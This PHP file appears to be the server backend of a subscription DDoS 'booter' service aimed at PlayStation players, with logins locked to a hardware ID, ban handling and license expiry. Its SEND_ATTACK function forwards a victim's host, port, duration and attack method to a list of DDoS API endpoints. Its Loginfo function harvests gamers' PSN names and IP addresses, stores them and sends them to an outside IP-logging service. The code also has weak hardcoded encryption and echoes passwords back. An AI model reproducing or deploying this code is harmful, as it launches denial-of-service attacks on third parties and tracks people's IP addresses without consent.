<?php

	include "database.php";
	class auth extends database{
		public function __construct()
		{
			$this->connect();
		}
		public function Encrypt($string)
		{
            $plaintext = $string;
            $password = base64_decode($_POST['ID']);
            $method = 'aes-256-cbc';
            $password = substr(hash('sha256', $password, true), 0, 32);
            $iv = chr(0x01) . chr(0x02) . chr(0x03) . chr(0x04) . chr(0x05) . chr(0x06) . chr(0x07) . chr(0x08) . chr(0x09) . chr(0x0A) . chr(0x0B) . chr(0x0C) . chr(0x0D) . chr(0x0E) . chr(0x0F) . chr(0x01);
            $encrypted = base64_encode(openssl_encrypt($plaintext, $method, $password, OPENSSL_RAW_DATA, $iv));
            return $encrypted;
		}
		public function Decrypt($string)
		{
            $plaintext = $string;
            $password = base64_decode($_POST['ID']);
            $method = 'aes-256-cbc';
            $password = substr(hash('sha256', $password, true), 0, 32);
            $iv = chr(0x01) . chr(0x02) . chr(0x03) . chr(0x04) . chr(0x05) . chr(0x06) . chr(0x07) . chr(0x08) . chr(0x09) . chr(0x0A) . chr(0x0B) . chr(0x0C) . chr(0x0D) . chr(0x0E) . chr(0x0F) . chr(0x01);
            $decrypted = openssl_decrypt(base64_decode($plaintext), $method, $password, OPENSSL_RAW_DATA, $iv);
            return $decrypted;
		}
		public function FreeMode()
		{
            $query = $this->db->prepare("SELECT * FROM `tool_settings` WHERE `name` = :license");
			$query->execute(array("license"=>self::sanitize("freemode")));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if($result["value"] != 'false')
				{
				    $return2 = array();
                    $query2 = $this->db->prepare("SELECT * FROM `black_list`");
	                $query2->execute();
	                $shit2 = $query2->fetchAll();
	                foreach ($shit2 as $row)
	                {
	                    $plaintext = $row["value"];
	                    $return2[$row["name"]] = $plaintext;
	                }                                      
                   // $this->logInformation($result['id'],$hash,$pcname,$hwid);
                    $return = array();
                    $query = $this->db->prepare("SELECT * FROM `offsets`");
	                $query->execute();
	                $shit = $query->fetchAll();
	                foreach ($shit as $row)
	                {
	                    $plaintext = $row["value"];
	                    $encrypted = $this->Encrypt($plaintext);
	                    $return[$row["name"]] = $encrypted;
	                }
					die($this->Encrypt('{"result":"success",
					"id":"1",
					"username":"freemode",
					"pic":"http://bestanimations.com/Nature/Storms/animated-lighning-bolt-strike-storm-gif-2.gif",
					"hwid":"0x0",
					"plan":"0",
					"level":"0",
					"sig":"FREE-FREE-FREE",
					"days_remain":"0",
					"session_id":"'.$this->Encrypt(base64_decode($_POST['ID'])).'",
					"black_list":'.json_encode($return2, JSON_FORCE_OBJECT).',
					"offset":'.json_encode($return, JSON_FORCE_OBJECT).',
					"",
					"",
				    "",
				    "advert2_url":""}'));      
				}
				else
				{
				   die($this->Encrypt('{"result":"freemode_over"}')); 
				}
			}
			else
			{
				die($this->Encrypt('{"result":"freemode_NF"}')); 
			}
		}
		public function forgotPW($username,$hwid)
		{
			$query = $this->db->prepare("SELECT * FROM `users` WHERE `username` = :license");
			$query->execute(array("license"=>self::sanitize($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result){
              if($result["hwid"]==$hwid)
                {
              	    $PW = generateRandomStringCUS(16);
              	    $this->update("users", array("password"=>password_hash($PW, PASSWORD_BCRYPT)), "username", $username);
                    die($this->Encrypt('{"result":"success","password":"'.$PW.'"}'));
                }
                else
                {
                    die($this->Encrypt('{"result":"incorrect_hwid"}'));
                }
			}
			else
			{
                die($this->Encrypt('{"result":"incorrect_username"}'));
			}
		}
		public function changePW($username,$hwid,$new)
		{
			$query = $this->db->prepare("SELECT * FROM `users` WHERE `username` = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
                if($result["hwid"]==$this->Decrypt($hwid)){
              	    $this->update("users", array("password"=>password_hash($new, PASSWORD_BCRYPT)), "username", $username);
                    die($this->Encrypt('{"result":"success","password":"'.$PW.'"}'));
                }
                else
                {
                    die($this->Encrypt('{"result":"incorrect_hwid"}'));
                }
			}
			else
			{
                die($this->Encrypt('{"result":"incorrect_username"}'));
			}
		}

		public function Error_Logging($username,$errormain,$errorinfo,$usernote)
		{
			if($usernote=="")
			{
				$usernote = "No note given by user";
			}
			$this->insert_query("error_log",
                array("username"=>$username,
                    "main_error"=>$errormain, 
                    "error_info"=>$errorinfo,
                    "usernote"=>$usernote,  
                ));
		}

		public function Black_list($username,$password,$PSN,$message)
        {
			$query = $this->db->prepare("SELECT * FROM `users` WHERE `username` = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($this->Decrypt($password),$result['password']))
				{
					$query1 = $this->db->prepare("SELECT * FROM `black_list` WHERE `userid` = :license");
			        $query1->execute(array("license"=>$result['id']));
			        $result1 = $query1->fetch(PDO::FETCH_ASSOC);
			        if($result1)
			        {
			        	$this->update("black_list", array("name"=>$this->Decrypt($PSN),"value"=>$this->Decrypt($message)), "userid", $$result['id']);
			        	die($this->Encrypt('{"result":"success"}'));
			        }
			        else
			        {
			        	die($this->Encrypt('{"result":"not_paid"}'));
			        }
				}
				else
				{
					die($this->Encrypt('{"result":"incorrect_details"}'));
				}
			}
			else
			{
                die($this->Encrypt('{"result":"incorrect_details"}'));
			}
		}
		public function history($username,$password, $hwid)
		{
            $query = $this->db->prepare("SELECT * FROM users WHERE username = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($this->Decrypt($password),$result['password']))
				{
					if($result['hwid'] == $this->Decrypt($hwid))
					{
						$query = $this->db->prepare("SELECT * FROM `bans` WHERE `userid` = :license");
			            $query->execute(array("license"=>self::sanitize($result['id'])));
			            $result2 = $query->fetch(PDO::FETCH_ASSOC);
			            if($result2)
			            {
				            if($result2['type'] == "Temp")
				            {
					            if(strtotime($result2['unban_when']) <= strtotime(date('Y-m-d h:i:s')))
					            {
						            $query = $this->db->prepare("DELETE FROM `bans` WHERE `username` = :license");
						            $query->execute(array("license"=>self::sanitize($username)));
						            die($this->Encrypt('{"result":"unbanned","sig":"'.$result['sig'].'"}'));
					            }
					            else
					            {
						            die($this->Encrypt('{"result":"temp_banned","sig":"'.$result['sig'].'"}'));
					            }
				            }
				            else
				            {
				             	die($this->Encrypt('{"result":"permanently_banned","sig":"'.$result['sig'].'"}'));   
				            }
				        }
				        else
				        {
				        	$query = $this->db->prepare("SELECT * FROM `PSN_IPHISTORY` WHERE userid = :asdf");
	                        $query->execute(array("asdf"=>self::sanitize($result['id'])));
	                        $shit = $query->fetchAll();
	                        $list = array();
	                        foreach ($shit as $row)
	                        {
	                        	array_push($list,$row["ID"],$row["name"],$row["ip"],$row["port"],$row["console"],$row["game"]);
	                        }
	                        die($this->Encrypt(implode( ":", $list )));
				        }
					}
					else
					{
                        die($this->Encrypt('{"result":"hwid_dont_match"}'));
					}
				}
				else
				{
                    die($this->Encrypt('{"result":"password_invalid"}'));
				}
			}
			else
			{
				die($this->Encrypt('{"result":"username_invalid"}'));
			}
		}
		public function AllUsersTool()
		{
        	$query = $this->db->prepare("SELECT * FROM `users`");
            $shit = $query->fetch(PDO::FETCH_ASSOC);
            $list = array();
            foreach ($shit as $row)
            {
            	array_push($list,$row["username"]);
	        }
            //    die($this->Encrypt('{"result":'.json_encode($list, JSON_FORCE_OBJECT).'}'));
            die($this->Encrypt(implode( ":", $list )));
            //die($this->Encrypt('{"1":"qmt-anger"}'));
		}


		/*public function AllUsersTool($username,$password, $hwid)
		{
            $query = $this->db->prepare("SELECT * FROM users WHERE username = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($this->Decrypt($password),$result['password']))
				{
					if($result['hwid'] == $this->Decrypt($hwid))
					{
						$query = $this->db->prepare("SELECT * FROM `bans` WHERE `userid` = :license");
			            $query->execute(array("license"=>self::sanitize($result['id'])));
			            $result2 = $query->fetch(PDO::FETCH_ASSOC);
			            if($result2)
			            {
				            if($result2['type'] == "Temp")
				            {
					            if(strtotime($result2['unban_when']) <= strtotime(date('Y-m-d h:i:s')))
					            {
						            $query = $this->db->prepare("DELETE FROM `bans` WHERE `username` = :license");
						            $query->execute(array("license"=>self::sanitize($username)));
						            die($this->Encrypt('{"result":"unbanned","sig":"'.$result['sig'].'"}'));
					            }
					            else
					            {
						            die($this->Encrypt('{"result":"temp_banned","sig":"'.$result['sig'].'"}'));
					            }
				            }
				            else
				            {
				             	die($this->Encrypt('{"result":"permanently_banned","sig":"'.$result['sig'].'"}'));   
				            }
				        }
				        else
				        {
				        	$query = $this->db->prepare("SELECT * FROM `users` WHERE id = :asdf");
	                        $query->execute(array("asdf"=>self::sanitize($result['id'])));
	                        $shit = $query->fetchAll();
	                        $list = array();
	                        foreach ($shit as $row)
	                        {
	                        	array_push($list,$row["id"],$row["username"]);
	                        }
                            //echo $list;
	                        die($this->Encrypt(implode( ":", $list )));
				        }
					}
					else
					{
                        die($this->Encrypt('{"result":"hwid_dont_match"}'));
					}
				}
				else
				{
                    die($this->Encrypt('{"result":"password_invalid"}'));
				}
			}
			else
			{
				die($this->Encrypt('{"result":"username_invalid"}'));
			}
		}*/
		public function delete_history($username,$password, $hwid)
		{
            $query = $this->db->prepare("SELECT * FROM users WHERE username = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($this->Decrypt($password),$result['password']))
				{
					if($result['hwid'] == $this->Decrypt($hwid))
					{
						$query = $this->db->prepare("SELECT * FROM `bans` WHERE `userid` = :license");
			            $query->execute(array("license"=>self::sanitize($result['id'])));
			            $result2 = $query->fetch(PDO::FETCH_ASSOC);
			            if($result2)
			            {
				            if($result2['type'] == "Temp")
				            {
					            if(strtotime($result2['unban_when']) <= strtotime(date('Y-m-d h:i:s')))
					            {
						            $query = $this->db->prepare("DELETE FROM `bans` WHERE `username` = :license");
						            $query->execute(array("license"=>self::sanitize($username)));
						            die($this->Encrypt('{"result":"unbanned","sig":"'.$result['sig'].'"}'));
					            }
					            else
					            {
						            die($this->Encrypt('{"result":"temp_banned","sig":"'.$result['sig'].'"}'));
					            }
				            }
				            else
				            {
				             	die($this->Encrypt('{"result":"permanently_banned","sig":"'.$result['sig'].'"}'));   
				            }
				        }
				        else
				        {
	                       $query = $this->db->prepare("DELETE FROM `PSN_IPHISTORY` WHERE `userid` = :license");
						   $query->execute(array("license"=>self::sanitize($result['id'])));
	                        die($this->Encrypt('{"result":"success"}'));
				        }
					}
					else
					{
                        die($this->Encrypt('{"result":"hwid_dont_match"}'));
					}
				}
				else
				{
                    die($this->Encrypt('{"result":"password_invalid"}'));
				}
			}
			else
			{
				die($this->Encrypt('{"result":"username_invalid"}'));
			}
		}
		public function delete_selected_history($username,$password, $hwid,$ID)
		{
            $query = $this->db->prepare("SELECT * FROM users WHERE username = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($this->Decrypt($password),$result['password']))
				{
					if($result['hwid'] == $this->Decrypt($hwid))
					{
						$query = $this->db->prepare("SELECT * FROM `bans` WHERE `userid` = :license");
			            $query->execute(array("license"=>self::sanitize($result['id'])));
			            $result2 = $query->fetch(PDO::FETCH_ASSOC);
			            if($result2)
			            {
				            if($result2['type'] == "Temp")
				            {
					            if(strtotime($result2['unban_when']) <= strtotime(date('Y-m-d h:i:s')))
					            {
						            $query = $this->db->prepare("DELETE FROM `bans` WHERE `username` = :license");
						            $query->execute(array("license"=>self::sanitize($username)));
						            die($this->Encrypt('{"result":"unbanned","sig":"'.$result['sig'].'"}'));
					            }
					            else
					            {
						            die($this->Encrypt('{"result":"temp_banned","sig":"'.$result['sig'].'"}'));
					            }
				            }
				            else
				            {
				             	die($this->Encrypt('{"result":"permanently_banned","sig":"'.$result['sig'].'"}'));   
				            }
				        }
				        else
				        {
	                        $query = $this->db->prepare("DELETE FROM PSN_IPHISTORY WHERE userid = :license AND ID = :asdf");
						    $query->execute(array("license"=>self::sanitize($result['id']),"asdf"=>self::sanitize($ID)));
	                        die($this->Encrypt('{"result":"success"}'));
				        }
					}
					else
					{
                        die($this->Encrypt('{"result":"hwid_dont_match"}'));
					}
				}
				else
				{
                    die($this->Encrypt('{"result":"password_invalid"}'));
				}
			}
			else
			{
				die($this->Encrypt('{"result":"username_invalid"}'));
			}
		}
		public function Login($username,$password, $hwid,$hash,$pcname){
			$canlogin = $this->db->prepare("SELECT * FROM `toolSettings` WHERE `id` = 1 ");
			$canlogin->execute();
			$resultfm = $canlogin->fetch(PDO::FETCH_ASSOC);
			if($resultfm['1'] == '0')
			{
				die($this->Encrypt('{"result":"login_disabled"}'));
			}
			$query = $this->db->prepare("SELECT * FROM users WHERE username = :license");
			$query->execute(array("license"=>$this->Decrypt($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($this->Decrypt($password),$result['password']))
				{
					if($result['hwid'] == $this->Decrypt($hwid))
					{
                        $query = $this->db->prepare("SELECT * FROM `bans` WHERE `userid` = :license");
			            $query->execute(array("license"=>self::sanitize($result['id'])));
			            $result2 = $query->fetch(PDO::FETCH_ASSOC);
			            if($result2)
			            {
				            if($result2['type'] == "Temp")
				            {
					            if(strtotime($result2['unban_when']) <= strtotime(date('Y-m-d h:i:s')))
					                {
						                $query = $this->db->prepare("DELETE FROM `bans` WHERE `username` = :license");
						                $query->execute(array("license"=>self::sanitize($username)));
						                die($this->Encrypt('{"result":"unbanned","sig":"'.$result['sig'].'"}'));
					                }
					                else
					                {
						                die($this->Encrypt('{"result":"temp_banned","sig":"'.$result['sig'].'"}'));
					                }
				                }
				                else
				                {
				             	    die($this->Encrypt('{"result":"permanently_banned","sig":"'.$result['sig'].'"}'));
					             
				                }
				            }
				            else
				            {
						        $today = date("Y-m-d H:i:s");
                                $date = $result['expiry_date'];
                                $date1 = new DateTime($result['expiry_date']);
                                $date2 = $date1->diff(new DateTime());
                                if ($date > $today)
                                {
                                 	$return1 = array();
                        	        $query1 = $this->db->prepare("SELECT * FROM `ddos_methods`");
	                                $query1->execute();
	                                $shit1 = $query1->fetchAll();
	                                foreach ($shit1 as $row)
	                                {
	                                	$plaintext = $row["value"];
                                        $password1 = '9zc3JKacr69';
                                        $method = 'aes-256-cbc';
                                        $password = substr(hash('sha256', $password1, true), 0, 32);
                                        $iv = chr(0x01) . chr(0x02) . chr(0x03) . chr(0x04) . chr(0x05) . chr(0x06) . chr(0x07) . chr(0x08) . chr(0x09) . chr(0x0A) . chr(0x0B) . chr(0x0C) . chr(0x0D) . chr(0x0E) . chr(0x0F) . chr(0x01);
                                        $encrypted = base64_encode(openssl_encrypt($plaintext, $method, $password1, OPENSSL_RAW_DATA, $iv));
	                       	            $return1[$row["name"]] = $plaintext;
	                                }
	                                $return2 = array();
                        	        $query2 = $this->db->prepare("SELECT * FROM `black_list`");
	                                $query2->execute();
	                                $shit2 = $query2->fetchAll();
	                                foreach ($shit2 as $row)
	                                {
	                                	$plaintext = $row["value"];
	                       	            $return2[$row["name"]] = $plaintext;
	                                }                                      
                        	        $this->logInformation($result['id'],$this->Decrypt($hash),$this->Decrypt($pcname),$this->Decrypt($hwid));
                        	        $return = array();
                        	        $query = $this->db->prepare("SELECT * FROM `offsets`");
	                                $query->execute();
	                                $shit = $query->fetchAll();
	                                foreach ($shit as $row)
	                                {
	                                	$plaintext = $row["value"];
	                                	$encrypted = $this->Encrypt($plaintext);
	                       	            $return[$row["name"]] = $encrypted;
	                                }
						            die($this->Encrypt('{"result":"success",
							        "id":"'.$this->Encrypt($result['id']).'",
							        "username":"'.$this->Encrypt($result['username']).'",
							        "password":"'.$this->Decrypt($password).'",
							        "pic":"'.$this->Encrypt($result['pic']).'",
							        "hwid":"'.$this->Encrypt($result['hwid']).'",
							        "email":"'.$result['email'].'",
							        "plan":"'.$result['admin'].'",
							        "level":"'.$result['level'].'",
							        "max_boot":"200",
							        "sig":"'.$this->Encrypt($result['sig']).'",
							        "session_id":"'.$this->Encrypt(base64_decode($_POST['ID'])).'",
							        "days_remain":"'.$date2->days.'",
							        "black_list":'.json_encode($return2, JSON_FORCE_OBJECT).',
							        "offset":'.json_encode($return, JSON_FORCE_OBJECT).',
							        "ddos_methods":'.json_encode($return1, JSON_FORCE_OBJECT).',
							        "advert1_pic":"",
					                "advert1_url":"",
					                "advert2_pic":"",
					                "advert2_url":""}'));
					            }
					            else
					            {
					    	     $this->update("users", array("level"=>0), "username", self::sanitize($username));
					    	     die($this->Encrypt('{"result":"time_expired","sig":"'.$result['sig'].'"}'));
					            }
					        }
					    }
					    else
					    {
						    if($result['hwid'] == "")
						    {
						  	$today = date("Y-m-d H:i:s");
                            $date = $result['expiry_date'];
						  	if ($date > $today)
                            {
                                $this->update("users", array("hwid"=>$this->Decrypt($hwid)), "username", $this->Decrypt($username));
					            die($this->Encrypt('{"result":"hwid_updated"}'));
                            }
                            else
                            {
                                $this->update("users", array("level"=>0), "username", self::sanitize($username));
					    	    die($this->Encrypt('{"result":"time_expired","sig":"'.$result['sig'].'"}'));
                            }
				        }
				        else
				        {
                            die($this->Encrypt('{"result":"hwid_dont_match"}'));
				        }		
					}				
			    }
			    else
			    {
				    die($this->Encrypt('{"result":"password_invalid"}'));
			    }
			}
			else
			{
				die($this->Encrypt('{"result":"username_invalid"}'));
			}
		}
		public function Version()
		{
            $query = $this->db->prepare("SELECT * FROM `tool_settings`");
			$query->execute();
			$result = $query->fetchAll();
			 $return1 = array();
			foreach ($result as $row)
	        {
                $return1[$row["name"]] = $row["value"];
	        }
                die($this->Encrypt('{"haxs":'.json_encode($return1, JSON_FORCE_OBJECT).'}'));
		}
		public function SEND_ATTACK($username,$password,$hwid,$host,$port,$time,$method)
		{
			if (empty($username)||empty($password)||empty($hwid))
			{
               die('{"result":"empty_paremeters"}');
			}
			else if(empty($host)||empty($port)||empty($time)||empty($method))
			{
               die('{"result":"empty_target_paremeters"}');
			}
			else
			{
                $query = $this->db->prepare("SELECT * FROM `users` WHERE `username` = :license");
			    $query->execute(array("license"=>self::sanitize($username)));
			    $result = $query->fetch(PDO::FETCH_ASSOC);
			    if($result)
			    {
                    if(password_verify($password,$result['password']))
                    {
                        if($result['hwid'] == "")
                        {
                     	    $today = date("Y-m-d H:i:s");
                            $date = $result['expiry_date'];
						  	if ($date > $today)   
                            {
                                $this->update("users", array("hwid"=>self::sanitize($hwid)), "username", self::sanitize($username));
					            die('{"result":"hwid_updated"}');
                            }
                            else
                            {
                                $this->update("users", array("level"=>0), "username", self::sanitize($username));
					    	    die('{"result":"time_expired","sig":"'.$result['sig'].'"}');
                            }
                        }
                        else
                        {
                        if($result['hwid'] == $hwid)
                        {
                        	$today = date("Y-m-d H:i:s");
                            $date = $result['expiry_date'];
                            if ($date > $today)
                            {
			                    $query2 = $this->db->prepare("SELECT * FROM `ddos_api`");
	                            $query2->execute();
	                            $shit = $query2->fetchAll();
	                        foreach ($shit as $row)
	                        {
		              
						    $api_timeout = 5000; 
                            $ch = curl_init($row["url"]."host={$host}&port={$port}&time={$time}&method={$method}");
                            curl_setopt($ch, CURLOPT_TIMEOUT, $api_timeout);
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                            curl_setopt($ch, CURLOPT_USERAGENT, "net api"); /* Can be anything except empty */
                            $response = curl_exec($ch);
                            curl_close($ch);
                            }
                            $date = new DateTime();
                            $newDate = $date->modify('+'.$time.' seconds');
                            $date2 = $newDate->format('Y-m-d H:i:s');
                            $date3 = $date->format('Y-m-d H:i:s');
                            if($method == "STOP")
                            {
                            $this->insert_query("ddos_attack_log",
                            array("userid"=>$result["id"],
                                "ip"=>$host, 
                                "port"=>$port, 
                                "time"=>$time, 
                                "method"=>$method,
                                "date"=>"2017-09-20 07:01:10" ));
                            }
                            else
                            {
                            $this->insert_query("ddos_attack_log",
                            array("userid"=>$result["id"],
                                "ip"=>$host, 
                                "port"=>$port, 
                                "time"=>$time, 
                                "method"=>$method,
                                "date"=>$date2 ));
                            }
                                $response2 = '';
                                die('{"result":"","response":"'.$response.'"}');/* Print the response for testing purposes */ 
					        }
					        else
					        {
					       	 $this->update("users", array("plan"=>0), "username", self::sanitize($username));
					    	 die('{"result":"time_expired"}');
					        }
                        }
                    }
                }
                else
                {
                  	die('{"result":"password_invalid"}');
                }
			}
		    else
			{
			   	die('{"result":"username_invalid"}');
			}
		}

		}
		public function Loginfo($username,$password, $hwid,$NAME,$IP,$port,$acc,$game,$time)
		{
			$query = $this->db->prepare("SELECT * FROM `users` WHERE `username` = :license");
			$query->execute(array("license"=>self::sanitize($username)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result)
			{
				if(password_verify($password,$result['password']))
				{
					if($result['hwid'] == $hwid)
					{
						$today = date("Y-m-d H:i:s");
                        $date = $result['expiry_date'];
                        $date1 = new DateTime($result['expiry_date']);
                        $date2 = $date1->diff(new DateTime());
                        if ($date > $today)
                        {
                            $query1 = $this->db->prepare("SELECT * FROM `PSNIPHISTORY` WHERE `userid` = :license AND 'name' = :name AND 'ip' = :ip");
			                $query1->execute(array("license"=>self::sanitize($result['id']),"name"=>self::sanitize($NAME),"ip"=>self::sanitize($IP)));
			                $result2 = $query1->fetch(PDO::FETCH_ASSOC);
			                if($result2)
			                {

                            }
                            else
                            {
                            	$api_timeout = 50; 
                                $ch = curl_init("https://insane-dev.xyz/api/?type=psniplog&gamertag=".$NAME."&ip=".$IP);
                                curl_setopt($ch, CURLOPT_TIMEOUT, $api_timeout);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "NET API"); 
                                $response = curl_exec($ch);
                                curl_close($ch);
                                
                                $today = date("Y-m-d H:i:s");//PSN resolver
                            $this->insert_query("PSNIPHISTORY", array("userid"=>$result['id'],"name"=>$NAME,"ip"=>$IP,"port"=>$port,"accountregion"=>$acc,"game"=>$game,"time"=>$today));
                            //PSN History
                           $this->insert_query("PSN_IPHISTORY", array("userid"=>$result['id'],"name"=>$NAME,"ip"=>$IP,"port"=>$port,"accountregion"=>$acc,"game"=>$game,"time"=>$today));
                                die('{"result":"logged_info"}');
                            } 
					    }
					    else
					    {
					    	$this->update("users", array("level"=>0), "username", self::sanitize($username));
					    	die('{"result":"time_expired","sig":"'.$result['sig'].'"}');
					    }
					}
					else
					{
                        die('{"result":"hwid_dont_match"}');    
					}
			    }
			    else
			    {
				    die('{"result":"password_invalid"}');
			    }
			}
			else
			{
				die('{"result":"username_invalid"}');
			}
		}
		public function getGeoCountry(){
			$ip = $_SERVER['REMOTE_ADDR'];
			$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
			return $details->country; // -> "Mountain View"
		}
		public function logInformation($id, $hash, $pcname, $hwid){
			$query = $this->db->prepare("SELECT * FROM `users` WHERE `id` = :license");
			$query->execute(array("license"=>self::sanitize($id)));
			$result = $query->fetch(PDO::FETCH_ASSOC);
			if($result){
				$this->insert_query("tool_logs", array("tool_hash"=>self::sanitize($hash), "user_id"=>self::sanitize($id), "pc_name"=>self::sanitize($pcname), "hwid"=>self::sanitize($hwid), "ip"=>$_SERVER['HTTP_CF_CONNECTING_IP'], "country"=>$this->getGeoCountry()));
			}
		}
	}